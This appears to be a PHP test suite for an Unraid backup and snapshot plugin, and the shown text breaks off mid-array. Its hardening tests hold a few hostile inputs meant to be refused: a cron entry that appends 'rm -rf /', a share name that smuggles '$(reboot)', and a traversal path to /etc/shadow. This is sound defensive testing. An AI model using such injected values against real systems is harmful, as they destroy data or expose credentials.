<?php
declare(strict_types=1);

/*
 * The office's tests — run them on the Unraid server, with Unraid's own PHP:
 *
 *   php /mnt/user/appdata/UnraidSecretaryOffice/tests/run.php
 *
 * They change nothing on the server: what writes files works on copies in a
 * temporary folder. Three parts:
 *   logic    the tricky functions (cron, snapshot retention and names, Emby detection,
 *            the gather's settings, the plugin's cron file,
 *            the menu bar's label, reports to Unraid's notifications, the team
 *            lead's «I know, thanks» and the Dashboard tile,
 *            Mr. Backupsy's packages and his Kopia per app and VM, a run skipped because
 *            the engine's lock was busy (and who holds it), Ms. Dustdevil's pictures,
 *            Mr. Restori's reader of the packages and his restores (steps, put back, the lock, a job on its own),
 *            the Consultant's monitoring externals and his installs, Ms. Protocolli's tour,
 *            the night watchman's rounds, bursts, baseline and «I know, thanks», his watch over what
 *            starts on its own (crontabs, .cron files, User Scripts, at, notification agents), his
 *            data flow (ss, smbstatus, zfs written, containers' counters; learning, the unusual),
 *            job.sh's guard against a second start in the same minute, Ms. Whereabouts on exclusive shares)
 *   hardening  the checks that keep requests, manifests, paths and links in
 *            bounds (safe writes, the mailbox, Ms. Dustdevil's
 *            manifests, Emby paths, anchored validators, the release link, the
 *            Consultant's secrets for Kopia: RAM only, never in a file, log or ps)
 *   strings  German and English have the same keys, Italian has every English
 *            key, no language has keys English lacks, placeholders and plurals
 *            match English, and every text the code asks for exists (desk.js,
 *            checks, errors)
 * Exit code 0 when everything passes.
 */

define('AGENT_LIBRARY_ONLY', 1);
// the repository, not the plugin's folder: the web files in public/, a data folder of its own (never the plugin's DATA_DIR)
define('OFFICE_WEB', dirname(__DIR__) . '/public');
putenv('OFFICE_DATA_DIR=' . dirname(__DIR__) . '/data');
require dirname(__DIR__) . '/agent/agent.php';
date_default_timezone_set('Europe/Zurich');

$GLOBALS['results'] = ['pass' => 0, 'fail' => []];

function check(string $what, bool $ok, string $detail = ''): void
{
    if ($ok) {
        $GLOBALS['results']['pass']++;
    } else {
        $GLOBALS['results']['fail'][] = $what . ($detail !== '' ? " — $detail" : '');
    }
}

function same(string $what, mixed $expected, mixed $actual): void
{
    check($what, $expected === $actual, 'expected ' . json_encode($expected) . ', got ' . json_encode($actual));
}

// ===================================================================== logic

function testCron(): void
{
    foreach (['0 3 * * *', '*/15 * * * *', '0 3 * * 1-6', '5,35 2 1 */2 7', '0-5/2 3 * * *'] as $c) {
        check("cron valid: $c", cronValid($c));
    }
    foreach (['61 3 * * *', '0 24 * * *', '0 3 0 * *', '0 3 * 13 *', '*/0 * * * *', '0 3 * * 8', '0 3 * *', '0 3 * * * rm -rf /', 'a b c d e'] as $c) {
        check("cron refused: $c", !cronValid($c));
    }
    $now = strtotime('2026-10-03 19:47:00');
    $cases = [
        '0 * * * *'    => ['2026-10-03 19:00', '2026-10-03 20:00'],
        '30 2 * * *'   => ['2026-10-03 02:30', '2026-10-04 02:30'],
        '0 3 * * 0'    => ['2026-09-27 03:00', '2026-10-04 03:00'],
        '*/15 * * * *' => ['2026-10-03 19:45', '2026-10-03 20:00'],
        '0 3 1 * *'    => ['2026-10-01 03:00', '2026-11-01 03:00'],
        '0 4 * * 1-5'  => ['2026-10-02 04:00', '2026-10-05 04:00'],
    ];
    foreach ($cases as $c => [$prev, $next]) {
        same("cron previous $c", $prev, date('Y-m-d H:i', (int) cronPrevious($c, $now)));
        same("cron next $c", $next, date('Y-m-d H:i', (int) cronNext($c, $now)));
    }
}

function testRetention(): void
{
    $now = strtotime('2026-10-03 19:47:00');
    $mk = fn (string $ds, string $name) => ['id' => "zfs:$ds@$name", 'fs' => 'zfs', 'ds' => $ds, 'vol' => "zfs:$ds", 'name' => $name, 'docker' => false];
    $all = [];
    for ($h = 0; $h < 30; $h++) {
        $all[] = $mk('master/appdata', snapPlanName('hourly', $now - $h * 3600));
        $all[] = $mk('master/appdata/immich', snapPlanName('hourly', $now - $h * 3600));
    }
    // others that must never go
    $all[] = $mk('master/appdata', 'unraidbackup-20261003-0200');
    $all[] = $mk('master/appdata', 'auto-hourly2-20261001-0100');
    $all[] = $mk('master/appdata', 'manuell-20261001-0100');
    $all[] = $mk('master/other', snapPlanName('hourly', $now - 99 * 3600));
    $all[] = ['id' => 'btrfs:/mnt/disk1/.btrfs-snap/20261001-0100', 'fs' => 'btrfs', 'ds' => '/mnt/disk1', 'vol' => 'btrfs:/mnt/disk1', 'name' => '20261001-0100', 'docker' => false];

    $plan = ['id' => 'hourly', 'keep' => 24, 'max_days' => 0, 'recursive' => true];
    $doomed = snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now);
    same('retention keep 24 recursive', 12, count($doomed));
    $foreign = array_filter($doomed, fn ($id) => !preg_match('/@uso-plan-hourly-\d{8}-\d{4}$/', $id) || str_contains($id, 'master/other'));
    same('retention never touches other snapshots', [], array_values($foreign));
    $plan['recursive'] = false;
    same('retention keep 24 not recursive', 6, count(snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now)));
    $plan['keep'] = 100;
    $plan['max_days'] = 1;
    same('retention max 1 day', 5, count(snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now)));
    $plan['keep'] = 1;
    $plan['max_days'] = 0;
    $one = snapPlanDoomed($plan, ['zfs:master/appdata'], $all, $now);
    same('retention keep 1', 29, count($one));
    check('retention keeps the newest', !in_array('zfs:master/appdata@' . snapPlanName('hourly', $now), $one, true));
    check('plan name matches its pattern', (bool) preg_match(snapPlanPattern('hourly'), snapPlanName('hourly', $now)));
    check('pattern ignores a similar plan', !preg_match(snapPlanPattern('hourly'), 'auto-hourly2-20261001-0100'));
    check('pattern ignores a similar plan (new name)', !preg_match(snapPlanPattern('hourly'), 'uso-plan-hourly2-20261001-0100'));
}

/**
 * Names (engine 2.20): what the office makes is named uso-…; old names stay recognised and age out by
 * their normal retention. Retention is destructive, so every pattern is pinned down exactly — in the
 * office (backupSnapPrefixes, backupIsEngineSnap, Ms. Snapshotini's plans) and in the engine
 * (lib/common.sh section 10), and both must agree.
 */
function testSnapshotNames(): void
{
    // the office: which prefixes are the engine's
    $both = ['uso-backup-', 'unraidbackup-'];
    same('names: no prefix set - the default and the old default', $both, backupSnapPrefixes(null));
    same('names: the old default counts as the default', $both, backupSnapPrefixes('unraidbackup-'));
    same('names: the new default', $both, backupSnapPrefixes('uso-backup-'));
    same('names: a prefix of the user\'s own stays alone', ['nightly-'], backupSnapPrefixes('nightly-'));

    // exactly <prefix>YYYYMMDD-HHMM - never anything looser
    $cases = [
        'uso-backup-20261006-0100'        => [true, false, false],     // [default prefixes, 'nightly-', as a plan "backup"]
        'unraidbackup-20261005-1557'      => [true, false, false],
        'nightly-20261006-0100'           => [false, true, false],
        'uso-backup-20261006-0100-x'      => [false, false, false],
        'unraidbackup-foo'                => [false, false, false],
        'unraidbackup-20261006-0100x'     => [false, false, false],
        'unraidbackup-2026100-0100'       => [false, false, false],
        'xuso-backup-20261006-0100'       => [false, false, false],
        "uso-backup-20261006-0100\n"      => [false, false, false],
        'UNRAIDBACKUP-20261006-0100'      => [false, false, false],
        'uso-plan-backup-20261006-0100'   => [false, false, true],
        'auto-backup-20261006-0100'       => [false, false, true],
        'uso-plan-backup-20261006-0100-x' => [false, false, false],
        '20261006-0100'                   => [false, false, false],
    ];
    foreach ($cases as $name => [$def, $own, $plan]) {
        same('names: engine\'s (defaults): ' . json_encode($name), $def, backupIsEngineSnap($name, $both));
        same('names: engine\'s (own prefix): ' . json_encode($name), $own, backupIsEngineSnap($name, ['nightly-']));
        same('names: plan "backup": ' . json_encode($name), $plan, (bool) preg_match(snapPlanPattern('backup'), $name));
    }
    same('names: btrfs folders are the engine\'s', [true, false], [backupIsEngineSnap('20261006-0100', $both, 'btrfs'), backupIsEngineSnap('20261006-0100', $both)]);
    same('names: a plan "backup" makes uso-plan-backup-…', 'uso-plan-backup-20261006-0100', snapPlanName('backup', strtotime('2026-10-06 01:00')));
    check('names: a plan\'s name is never the engine\'s', !backupIsEngineSnap(snapPlanName('backup', time()), $both));

    // Ms. Snapshotini's retention: old and new names are one series; the engine's names are refused
    $now = strtotime('2026-10-06 12:00:00');
    $mk = fn (string $ds, string $name) => ['id' => "zfs:$ds@$name", 'fs' => 'zfs', 'ds' => $ds, 'vol' => "zfs:$ds", 'name' => $name, 'docker' => false];
    $all = [$mk('mother/drop', 'auto-backup-20261006-0700'), $mk('mother/drop', 'auto-backup-20261006-0800'), $mk('mother/drop', 'auto-backup-20261006-0900'),
            $mk('mother/drop', 'uso-plan-backup-20261006-1000'), $mk('mother/drop', 'uso-plan-backup-20261006-1100'), $mk('mother/drop', 'uso-plan-backup-20261006-1200'),
            $mk('mother/drop', 'uso-backup-20261006-0100'), $mk('mother/drop', 'unraidbackup-20261005-2142'), $mk('mother/drop', 'uso-plan-backup-20261006-0100-x'),
            $mk('mother/drop', 'uso-plan-backups-20261006-0100')];
    $plan = ['id' => 'backup', 'keep' => 3, 'max_days' => 0, 'recursive' => false];
    same('plan retention: old auto- and new uso-plan- names are one series, the oldest go',
        ['zfs:mother/drop@auto-backup-20261006-0900', 'zfs:mother/drop@auto-backup-20261006-0800', 'zfs:mother/drop@auto-backup-20261006-0700'],
        snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, $both));
    $plan['keep'] = 1;
    $doomed = snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, $both);
    same('plan retention: keep 1 - only the plan\'s, never the engine\'s or look-alikes', 5, count($doomed));
    check('plan retention: the newest stays', !in_array('zfs:mother/drop@uso-plan-backup-20261006-1200', $doomed, true));
    same('plan retention: what matches the engine\'s (own) prefix is refused, even when it looks like a plan\'s - the rest is the series',
        ['zfs:mother/drop@auto-backup-20261006-0800', 'zfs:mother/drop@auto-backup-20261006-0700'],
        snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, ['uso-plan-backup-']));
    same('plan retention: the same for an old auto- look-alike', ['zfs:mother/drop@uso-plan-backup-20261006-1100', 'zfs:mother/drop@uso-plan-backup-20261006-1000'],
        snapPlanDoomed($plan, ['zfs:mother/drop'], $all, $now, ['auto-backup-']));
    $engineOnly = [$mk('mother/drop', 'uso-backup-20261006-0100'), $mk('mother/drop', 'unraidbackup-20261005-2142'), $mk('mother/drop', 'unraidbackup-20261005-1637')];
    same('plan retention: a plan "backup" never takes the engine\'s snapshots', [], snapPlanDoomed($plan, ['zfs:mother/drop'], $engineOnly, $now, $both));

    // the engine (bash): the same rule
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $tmp = sys_get_temp_dir() . '/office-tests-names-' . getmypid();
    @mkdir($tmp, 0700, true);
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("UB_DATA=$tmp/data; source $lib >/dev/null 2>&1; $script") . ' 2>&1'));
    $resolve = fn (string $p) => $sh("snap_prefix_resolve " . escapeshellarg($p) . '; printf "%s|%s" "$SNAP_PREFIX" "${SNAP_PREFIXES[*]}"');
    same('engine names: no prefix set', 'uso-backup-|uso-backup- unraidbackup-', $resolve(''));
    same('engine names: the old default counts as the default', 'uso-backup-|uso-backup- unraidbackup-', $resolve('unraidbackup-'));
    same('engine names: the new default', 'uso-backup-|uso-backup- unraidbackup-', $resolve('uso-backup-'));
    same('engine names: a prefix of the user\'s own stays alone', 'nightly-|nightly-', $resolve('nightly-'));
    foreach ([['snap_prefix = unraidbackup-', 'uso-backup-|unraidbackup-'], ['snap_prefix = uso-backup-', 'uso-backup-|uso-backup-'],
              ['snap_prefix = nightly-', 'nightly-|nightly-'], ['', 'uso-backup-|']] as $i => [$line, $want]) {
        file_put_contents("$tmp/s$i.ini", "[general]\n$line\n");
        same("engine names: settings.ini '$line' - the name and what it says", $want, $sh("cfg_load $tmp/s$i.ini; apply_settings; printf '%s|%s' \"\$SNAP_PREFIX\" \"\$SNAP_PREFIX_SET\""));
    }

    // snap_filter and snap_is_ours against the office's backupIsEngineSnap, line by line
    $lines = ['pool/a@uso-backup-20261006-0100', 'pool/a@unraidbackup-20261005-1557', 'pool/a@uso-backup-20261006-0100-x', 'pool/a@unraidbackup-foo',
              'pool/a@uso-plan-backup-20261006-0100', 'pool/a@auto-backup-20261006-0100', 'pool/a@xuso-backup-20261006-0100',
              'uso-backup-20261006-0100', 'pool/a', '@uso-backup-20261006-0100', 'pool/a@uso-backup-20261006-01000', 'pool/a@UNRAIDBACKUP-20261006-0100',
              'pool/a@nightly-20261006-0100', 'pool/a@unraidbackup-20261006-0100 ', 'pool/a/b@uso-backup-20261006-0100'];
    file_put_contents("$tmp/list", implode("\n", $lines) . "\n");
    foreach (['', 'nightly-'] as $p) {
        $prefixes = backupSnapPrefixes($p === '' ? null : $p);
        $want = array_values(array_filter($lines, fn ($l) => preg_match('#^[^@\s]+@#', $l) && backupIsEngineSnap(substr($l, strpos($l, '@') + 1), $prefixes)));
        same("engine names: snap_filter with " . ($p ?: 'the defaults') . ' - as the office sees it', implode("\n", $want),
            $sh('snap_prefix_resolve ' . escapeshellarg($p) . "; snap_filter <$tmp/list"));
    }
    same('engine names: snap_filter (defaults)', "pool/a@uso-backup-20261006-0100\npool/a@unraidbackup-20261005-1557\npool/a/b@uso-backup-20261006-0100",
        $sh("snap_prefix_resolve ''; snap_filter <$tmp/list"));
    same('engine names: snap_filter (own prefix)', 'pool/a@nightly-20261006-0100', $sh("snap_prefix_resolve nightly-; snap_filter <$tmp/list"));

    // the engine's ZFS retention: oldest first in, what goes out - only its own, old and new names one series
    $series = ['pool/a@unraidbackup-20261001-0100', 'pool/a@auto-x-20261001-0200', 'pool/a@unraidbackup-20261002-0100', 'pool/a@unraidbackup-20261002-0100-keep',
               'pool/a@uso-backup-20261003-0100', 'pool/a@manual-20261003-0900', 'pool/a@uso-backup-20261004-0100'];
    file_put_contents("$tmp/series", implode("\n", $series) . "\n");
    $prune = fn (string $prefix, string $ret) => str_replace("\n", ',', $sh('snap_prefix_resolve ' . escapeshellarg($prefix) . '; zfs_prune_select ' . escapeshellarg($ret) . " <$tmp/series"));
    same('engine retention: keep 2 - the old names go first, nothing else', 'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100', $prune('', '2 0 0'));
    same('engine retention: the old default in settings.ini - the same', 'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100', $prune('unraidbackup-', '2 0 0'));
    same('engine retention: keep 0 - all of its own, still nothing else',
        'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100,pool/a@uso-backup-20261003-0100,pool/a@uso-backup-20261004-0100', $prune('', '0 0 0'));
    same('engine retention: 7 4 6 keeps them all', '', $prune('', '7 4 6'));
    same('engine retention: one per month keeps the newest of the month', 'pool/a@unraidbackup-20261001-0100,pool/a@unraidbackup-20261002-0100,pool/a@uso-backup-20261003-0100',
        $prune('', '0 0 1'));
    same('engine retention: an own prefix never touches the old default\'s', '', $prune('nightly-', '0 0 0'));
    same('engine retention: a broken retention lets nothing go', '', $prune('', '7 x 6'));
    same('engine retention: an empty retention lets nothing go', '', $prune('', ''));

    // settings.ini: which prefixes will do
    foreach (['uso-backup-' => 0, 'unraidbackup-' => 0, 'nightly_1-' => 0, 'a-b-c-' => 0, 'uso-plan-x-' => 1, 'uso-backup' => 1, 'Uso-' => 1, 'a--' => 1, '-a-' => 1, 'a.b-' => 1] as $p => $errors) {
        file_put_contents("$tmp/v.ini", "[general]\nsnap_prefix = $p\n");
        same("engine names: settings.ini snap_prefix = $p", (string) $errors, $sh("cfg_load $tmp/v.ini; cfg_validate >/dev/null; echo \${#CFG_ERRORS[@]}"));
    }
    foreach (['uso-backup-' => 0, 'nightly-' => 0, 'auto-' => 1, 'auto-daily-' => 1, 'uso-plan-x-' => 1, 'x' => 1] as $p => $bad) {
        same("engine names: a new prefix $p", (string) $bad, $sh('snap_prefix_ok ' . escapeshellarg($p) . ' && echo 0 || echo 1'));
    }
    same('engine names: Kopia\'s description', 'uso-backup', $sh('printf %s "$UB_KOPIA_DESC"'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

function testEmby(): void
{
    foreach (['emby/embyserver:latest', 'emby/embyserver_arm64v8:4.8', 'linuxserver/emby', 'lscr.io/linuxserver/emby:latest',
              'ghcr.io/linuxserver/emby@sha256:abc', 'binhex/arch-emby:latest', 'registry:5000/emby-server:beta'] as $i) {
        check("emby server image: $i", embyIsServerImage($i));
    }
    foreach (['uping/embystat', 'helmi/embycache', 'jellyfin/jellyfin', 'lscr.io/linuxserver/jellyfin', 'kopia/kopia'] as $i) {
        check("not an emby server: $i", !embyIsServerImage($i));
    }

    // does a share suit EmbyCache with the pool "master"?
    foreach ([['ok', ['shareUseCache' => 'yes', 'shareCachePool' => 'master']],
              ['no_array', ['shareUseCache' => 'yes', 'shareCachePool' => 'hive', 'shareCachePool2' => 'ripley']],
              ['other_pool', ['shareUseCache' => 'yes', 'shareCachePool' => 'cache']],
              ['array_only', ['shareUseCache' => 'no']],
              ['pool_only', ['shareUseCache' => 'prefer', 'shareCachePool' => 'master']],
              ['pool_only', ['shareUseCache' => 'only', 'shareCachePool' => 'master']]] as [$want, $cfg]) {
        same('emby share fit: ' . json_encode($cfg), $want, embyShareFit($cfg, 'master'));
    }

    // the gather's consolidate.ini: bash sources it, so every value is quoted and checked
    $ini = embyGatherIni(['shares' => ['Filme', 'Meine Filme'], 'min_free_gb' => 256, 'dup_check' => 'size'],
        ['/mnt/master', '/mnt/disk1', '/mnt/user0', '/mnt/bad pool'], "/x/it's/consolidate.log", '/x/embycache_exclude.txt');
    check('gather ini: shares quoted', str_contains($ini, "BASE_DIRS=('/mnt/user/Filme' '/mnt/user/Meine Filme')\n"));
    same('gather ini: only real pools as cache', 1, preg_match("/^CACHE_PATTERN='\\/mnt\\/master'$/m", $ini));
    check('gather ini: never --include-cache, always dry by default', str_contains($ini, "CACHE_ONLY_TARGET='skip'") && str_contains($ini, "DRYRUN=true\n"));
    $tmp = sys_get_temp_dir() . '/office-tests-gather-' . getmypid() . '.ini';
    file_put_contents($tmp, $ini . 'echo "${BASE_DIRS[1]}|$MIN_FREE_GB|$LOGFILE"' . "\n");
    same('gather ini: bash reads it back', "/mnt/user/Meine Filme|256|/x/it's/consolidate.log", trim((string) shell_exec('bash ' . escapeshellarg($tmp))));
    unlink($tmp);
    try {
        embyGatherIni(['shares' => ['a$(reboot)'], 'min_free_gb' => 1, 'dup_check' => 'size'], [], '/l', '/e');
        check('gather ini refuses a strange share name', false);
    } catch (Problem $p) {
        same('gather ini refuses a strange share name', 'emby_bad_share', $p->key);
    }

    // run output for the page: progress lines collapsed, colour codes gone
    same('emby output: progress collapsed', "📂 Scanne: /mnt/user/Filme\n   🚚 [disk2 -> disk1] a.srt\nfertig",
        embyPlainOutput("   [1/2] 50% - A \e[K\r\r\e[K📂 Scanne: /mnt/user/Filme\n   [2/2] 100% - B \e[K\r   [2/2] 100% - B \e[K\r\n\r\e[K   🚚 [disk2 -> disk1] a.srt\n"
            . "2026-10-04 18:00:00,123 | INFO | fertig"));
}

/** The plugin's cron file against a copy: only the job's own line changes, the order stays */
function testOfficeCron(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-cron-' . getmypid();
    @mkdir($tmp, 0700, true);
    $file = "$tmp/office.cron";

    officeJobSetSchedule('snapshots', '*/5 * * * *', $file, false);
    officeJobSetSchedule('backup', '0 2 * * *', $file, false);
    same('office cron: both jobs', ['backup' => '0 2 * * *', 'snapshots' => '*/5 * * * *'], officeCronLines($file));
    $lines = array_values(array_filter(explode("\n", (string) file_get_contents($file)), fn ($l) => $l !== '' && $l[0] !== '#'));
    same('office cron: backup line first', '0 2 * * * ' . officeJobCommand('backup'), $lines[0] ?? null);

    officeJobSetSchedule('backup', '30  3 * * 1-5', $file, false);
    same('office cron: changed, spaces tidied', ['backup' => '30 3 * * 1-5', 'snapshots' => '*/5 * * * *'], officeCronLines($file));

    officeJobSetSchedule('gather', '0 4 * * 0', $file, false);
    officeJobSetSchedule('embycache', '5 * * * *', $file, false);
    same('office cron: Jack Emby\'s jobs beside them', ['backup' => '30 3 * * 1-5', 'snapshots' => '*/5 * * * *', 'embycache' => '5 * * * *', 'gather' => '0 4 * * 0'], officeCronLines($file));
    officeJobSetSchedule('embycache', null, $file, false);
    officeJobSetSchedule('gather', null, $file, false);

    officeJobSetSchedule('backup', null, $file, false);
    same('office cron: backup off, snapshots kept', ['snapshots' => '*/5 * * * *'], officeCronLines($file));
    officeJobSetSchedule('snapshots', null, $file, false);
    check('office cron: file gone when empty', !file_exists($file));

    foreach (['0 3 * * * rm -rf /', '61 3 * * *'] as $bad) {
        try {
            officeJobSetSchedule('backup', $bad, $file, false);
            check("office cron refuses $bad", false);
        } catch (Problem $p) {
            same("office cron refuses $bad", 'bad_cron', $p->key);
        }
    }
    try {
        officeJobSetSchedule('rm', '0 3 * * *', $file, false);
        check('office cron refuses an unknown job', false);
    } catch (Problem $p) {
        check('office cron refuses an unknown job', true);
    }
    // a line someone added by hand is not ours
    file_put_contents($file, "0 4 * * * bash /tmp/job.sh backup > /dev/null 2>&1\n");
    same('office cron: foreign line ignored', [], officeCronLines($file));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/** The office's label in Unraid's menu bar (src/place.php): what passes, and the page's Name= line on a copy */
function testMenuName(): void
{
    foreach (['Sekretariat', 'Office', 'USO', 'Mein Büro', 'Büro 2.0', 'A', 'R&D'] as $ok) {
        check("menu name ok: $ok", officeMenuNameValid($ok));
    }
    foreach (['', ' Office', 'Office ', 'x"y', '${HOME}', 'a\\b', "a\nb", '1234567890123456', 'end-', '<b>'] as $bad) {
        check('menu name refused: ' . json_encode($bad), !officeMenuNameValid($bad));
    }
    check('menu name: 15 characters (umlauts count once)', officeMenuNameValid('Büroküche Ölmü'));

    $tmp = sys_get_temp_dir() . '/office-tests-menu-' . getmypid();
    @mkdir($tmp, 0700, true);
    copy(dirname(__DIR__) . '/plugin/' . OFFICE_MENU_PAGE, "$tmp/" . OFFICE_MENU_PAGE);
    $before = (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE);
    check('menu page: default name in the repository', str_contains($before, "\nName=\"" . OFFICE_MENU_DEFAULT . "\"\n"));
    check('menu page: renamed', officeMenuPageApply($tmp, 'Büro & Co'));
    $after = (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE);
    same('menu page: only the Name= line changed', str_replace('Name="' . OFFICE_MENU_DEFAULT . '"', 'Name="Büro & Co"', $before), $after);
    same('menu page: Unraid reads the name', 'Büro & Co', parse_ini_string(explode("\n---\n", $after)[0])['Name'] ?? null);
    check('menu page: a bad name changes nothing', !officeMenuPageApply($tmp, 'x"y') && file_get_contents("$tmp/" . OFFICE_MENU_PAGE) === $after);

    // under Settings → User Utilities: Menu=, Title= and Icon=; back in the menu bar as it was
    check('menu page: to Settings', officeMenuPageApply($tmp, 'Büro & Co', 'settings'));
    $ini = parse_ini_string(explode("\n---\n", (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE))[0]);
    same('menu page: under Settings', ['Utilities', 'Büro & Co', 'Büro & Co', 'unraid-secretary-office.png', 'building-o', 'f0f7'],
        [$ini['Menu'] ?? null, $ini['Name'] ?? null, $ini['Title'] ?? null, $ini['Icon'] ?? null, $ini['Tag'] ?? null, $ini['Code'] ?? null]);
    check('menu page: back to the menu bar', officeMenuPageApply($tmp, OFFICE_MENU_DEFAULT, 'menu'));
    same('menu page: as in the repository again', $before, file_get_contents("$tmp/" . OFFICE_MENU_PAGE));
    check('menu page: an unknown place changes nothing', !officeMenuPageApply($tmp, 'Office', 'dock'));
    same('menu url: menu bar', '/SecretaryOffice', officeMenuUrl('menu'));
    same('menu url: settings', '/Settings/SecretaryOffice', officeMenuUrl('settings'));

    // only a button in Unraid's header: the page without Menu=, the button page with it — and back
    copy(dirname(__DIR__) . '/plugin/' . OFFICE_BUTTON_PAGE, "$tmp/" . OFFICE_BUTTON_PAGE);
    $buttonBefore = (string) file_get_contents("$tmp/" . OFFICE_BUTTON_PAGE);
    check('menu page: to a button', officeMenuPageApply($tmp, 'USO', 'button'));
    $ini = parse_ini_string(explode("\n---\n", (string) file_get_contents("$tmp/" . OFFICE_MENU_PAGE))[0]);
    $btn = parse_ini_string(explode("\n---\n", (string) file_get_contents("$tmp/" . OFFICE_BUTTON_PAGE))[0]);
    same('menu page: no entry of its own as a button', [null, 'USO', 'USO'], [$ini['Menu'] ?? null, $ini['Name'] ?? null, $ini['Title'] ?? null]);
    same('button page: in the header', ['Buttons:90', 'USO', 'building-o', '/SecretaryOffice'], [$btn['Menu'] ?? null, $btn['Title'] ?? null, $btn['Icon'] ?? null, $btn['Href'] ?? null]);
    // its icon: the desk bell as a CSS mask in the header's text colour (Icon=/Code= are only the fallback).
    // Unraid runs a button page's body through parse_text() in <head> of every page: nothing there may match it
    $body = explode("\n---\n", $buttonBefore, 2)[1] ?? '';
    check('button page: the desk bell as a mask in currentColor', preg_match('/\.nav-item\.SecretaryOfficeButton\{--sso-bell:url\("data:image\/svg\+xml,([^"]*)"\)\}/', $body, $m) === 1
        && !preg_match('/[<>#]/', $m[1]) && @simplexml_load_string(rawurldecode($m[1])) !== false
        && str_contains($body, 'mask:var(--sso-bell)') && str_contains($body, 'background-color:currentColor'));
    check('button page: nothing for parse_text', !preg_match('/_\((.+?)\)_|^:(.+_help|.+_plug):$|^:end$/m', $body));
    same('menu url: button', '/SecretaryOffice', officeMenuUrl('button'));
    check('menu page: from the button back to the menu bar', officeMenuPageApply($tmp, OFFICE_MENU_DEFAULT, 'menu'));
    same('menu page: as in the repository after the button', $before, file_get_contents("$tmp/" . OFFICE_MENU_PAGE));
    same('button page: as in the repository again', $buttonBefore, file_get_contents("$tmp/" . OFFICE_BUTTON_PAGE));
    check('menu page: missing page', !officeMenuPageApply("$tmp/none", 'Office'));
    exec('rm -rf ' . escapeshellarg($tmp));
}

function testEstimates(): void
{
    // newest first, like backupHistory()
    $run = fn (string $id, string $result, int $total, array $kopia) => ['run' => $id, 'started' => 1000, 'finished' => 1000 + $total,
        'result' => $result, 'kopia_first' => null,
        'kopia' => array_map(fn ($n, $s) => ['name' => $n, 'ok' => true, 'seconds' => $s, 'finished' => 1000 + $total], array_keys($kopia), $kopia)];
    $first = $run('first', 'warnings', 37632, ['appdata' => 21850]);
    $small = fn (string $id, int $t, int $a) => $run($id, 'ok', $t, ['appdata' => $a]);

    $e = backupEstimates([$small('b', 547, 86), $first]);
    same('estimate: after the first run the newest counts', 547, $e['total']);
    same('estimate: newest Kopia source', 86, $e['sources']['appdata'] ?? null);

    $e = backupEstimates([$run('x', 'failed', 17, []), $run('y', 'aborted', 464, []), $small('b', 547, 86), $first]);
    same('estimate: failed and aborted runs skipped', 547, $e['total']);

    $e = backupEstimates([$small('d', 600, 90), $small('c', 30000, 20000), $small('b', 547, 86), $first]);
    same('estimate: one slow run among three does not count', 600, $e['total']);
    same('estimate: median Kopia of the last three', 90, $e['sources']['appdata'] ?? null);

    $e = backupEstimates([]);
    same('estimate: nothing known', null, $e['total']);
}

/**
 * Mr. Backupsy and a first upload to Kopia: which source has no snapshot in the repository yet (a new
 * repository starts every source anew), the Kopia process found in /proc (a copy), what it read, the
 * snapshot's size, and the rate between looks — replayed with what nostromo's upload showed on 2026-10-06
 */
function testBackupFirstUpload(): void
{
    $run = fn (string $id, int $started, array $kopia) => ['run' => $id, 'started' => $started,
        'kopia' => array_map(fn ($n, $ok) => ['name' => $n, 'ok' => $ok, 'seconds' => 3, 'finished' => $started + 60], array_keys($kopia), $kopia)];
    $history = [$run('c', 3000, ['appdata' => true, 'app:immich' => false]), $run('b', 2000, ['Backups_statisch' => true]), $run('a', 1000, ['appdata' => true])];
    same('first upload: copied before, the repository unknown — not the first time', false, backupFirstUpload('Backups_statisch', $history, null));
    same('first upload: copied only into an earlier repository — the first time', true, backupFirstUpload('Backups_statisch', $history, 2500));
    same('first upload: copied since the repository came', false, backupFirstUpload('appdata', $history, 2500));
    same('first upload: failed so far, or never there', [true, true], [backupFirstUpload('app:immich', $history, null), backupFirstUpload('isos', $history, null)]);

    same('first upload: a container path on the host (the longest mapping)', '/mnt/user/appdata/kopia/repository.config',
        backupContainerHostPath([['Source' => '/mnt/user/appdata/kopia', 'Destination' => '/config'], ['Source' => '/mnt/user', 'Destination' => '/']],
            '/config/repository.config'));
    same('first upload: not mapped, or with ..', [null, null], [backupContainerHostPath([['Source' => '/mnt/x', 'Destination' => '/data']], '/config/repository.config'),
        backupContainerHostPath([['Source' => '/mnt/user/appdata/kopia', 'Destination' => '/config']], '/config/../etc/shadow')]);
    $policies = [['kind' => 'share', 'name' => 'Backups_statisch', 'path' => '/backup-snapshots/Backups_statisch'],
                 ['kind' => 'app', 'name' => 'immich', 'path' => '/backup-snapshots/.apps/immich']];
    same('first upload: where Kopia reads a source', [['/backup-snapshots/Backups_statisch', '/Backups_statisch'], ['/backup-snapshots/.apps/immich', '/.apps/immich'],
        [null, '/.vms/Debian'], [null, '/_flash']],
        [backupKopiaSourcePath('Backups_statisch', $policies), backupKopiaSourcePath('app:immich', $policies), backupKopiaSourcePath('vm:Debian', $policies),
         backupKopiaSourcePath('flash', $policies)]);

    // /proc as the host sees the engine's docker exec: the client, Kopia in the container, another source
    $proc = sys_get_temp_dir() . '/office-tests-upload-' . getmypid();
    $ps = ['3123' => ['docker', 'exec', '-u', '0', 'kopia', 'kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch', '--description', 'uso-backup 20261006-0100'],
           '4456' => ['kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch', '--description', 'uso-backup 20261006-0100'],
           '5789' => ['kopia', '--no-progress', 'snapshot', 'create', '/backup-snapshots/Backups_statisch_alt'],
